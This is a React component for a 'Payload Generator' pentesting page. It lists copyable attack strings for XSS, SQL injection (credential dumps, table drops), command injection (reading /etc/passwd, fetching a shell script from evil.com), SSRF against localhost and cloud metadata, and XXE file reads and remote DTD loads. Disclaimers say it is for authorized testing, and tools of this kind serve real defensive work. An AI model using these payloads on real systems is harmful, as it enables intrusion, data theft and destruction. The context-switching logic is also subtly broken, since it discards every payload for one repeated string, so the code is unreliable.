'use client';
import { useState } from 'react';
import { Code, Copy, CheckCircle, AlertTriangle } from 'lucide-react';

const payloadTemplates: Record<string, string[]> = {
  xss: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>', 'javascript:alert(1)', '<svg/onload=alert(1)>', '{{constructor.constructor(\'alert(1)\')()}}'],
  sqli: ["' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT null, username, password FROM users--", "1; DROP TABLE users--", "' AND SLEEP(5)--"],
  cmdi: ["; ls -la", "| cat /etc/passwd", "`whoami`", "$(id)", "& dir", "|| wget http://evil.com/shell.sh"],
  ssrf: ["http://127.0.0.1", "http://localhost:8080", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "gopher://127.0.0.1:9000/_", "dict://127.0.0.1:11211/stats"],
  xxe: ['<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>', '<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe; ]>', '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&test;</root>']
};

export default function PayloadGenerator() {
  const [type, setType] = useState<keyof typeof payloadTemplates>('xss');
  const [context, setContext] = useState<'generic' | 'attribute' | 'json' | 'xml'>('generic');
  const [copiedIdx, setCopiedIdx] = useState<number | null>(null);

  const getPayloads = () => {
    let payloads = [...payloadTemplates[type]];
    if (context === 'attribute') payloads = payloads.map(p => `" onmouseover="alert(1)`);
    else if (context === 'json') payloads = payloads.map(p => `"}; alert(1); {/*`);
    else if (context === 'xml' && type === 'xss') payloads = ['<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'];
    return payloads;
  };

  const copyPayload = (payload: string, idx: number) => {
    navigator.clipboard.writeText(payload);
    setCopiedIdx(idx);
    setTimeout(() => setCopiedIdx(null), 2000);
  };

  return (
    <div className="space-y-6">
      <div><h1 className="text-2xl font-bold text-white mb-2">Payload Generator</h1><p className="text-gray-400">Generate context-aware payloads for security testing. <span className="text-cyber-warning">For authorized testing only.</span></p></div>
      <div className="cyber-panel p-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
          <div>
            <label className="text-xs font-mono text-cyber-secondary mb-2 block">VULNERABILITY TYPE</label>
            <select value={type} onChange={(e) => setType(e.target.value as any)} className="cyber-input w-full">
              <option value="xss">Cross-Site Scripting (XSS)</option>
              <option value="sqli">SQL Injection (SQLi)</option>
              <option value="cmdi">Command Injection</option>
              <option value="ssrf">Server-Side Request Forgery (SSRF)</option>
              <option value="xxe">XML External Entity (XXE)</option>
            </select>
          </div>
          <div>
            <label className="text-xs font-mono text-cyber-secondary mb-2 block">INJECTION CONTEXT</label>
            <select value={context} onChange={(e) => setContext(e.target.value as any)} className="cyber-input w-full">
              <option value="generic">Generic / HTML Body</option>
              <option value="attribute">HTML Attribute</option>
              <option value="json">JSON Value</option>
              <option value="xml">XML Node</option>
            </select>
          </div>
        </div>
        <div className="space-y-3">
          {getPayloads().map((payload, idx) => (
            <div key={idx} className="flex items-center gap-3 p-3 rounded bg-cyber-black border border-cyber-border group hover:border-cyber-primary/50 transition-colors">
              <Code className="w-4 h-4 text-cyber-primary flex-shrink-0" />
              <code className="flex-1 text-sm font-mono text-cyber-secondary break-all">{payload}</code>
              <button onClick={() => copyPayload(payload, idx)} className="p-2 hover:bg-cyber-border rounded transition-colors flex-shrink-0">
                {copiedIdx === idx ? <CheckCircle className="w-4 h-4 text-cyber-primary" /> : <Copy className="w-4 h-4 text-gray-400" />}
              </button>
            </div>
          ))}
        </div>
        <div className="mt-6 p-4 rounded bg-cyber-warning/10 border border-cyber-warning/30 flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-cyber-warning flex-shrink-0 mt-0.5" />
          <div>
            <h4 className="text-sm font-semibold text-cyber-warning mb-1">Educational Use Only</h4>
            <p className="text-xs text-gray-400">These payloads are for authorized security testing and educational purposes. Unauthorized use against systems you do not own or have explicit permission to test is illegal.</p>
          </div>
        </div>
      </div>
    </div>
  );
}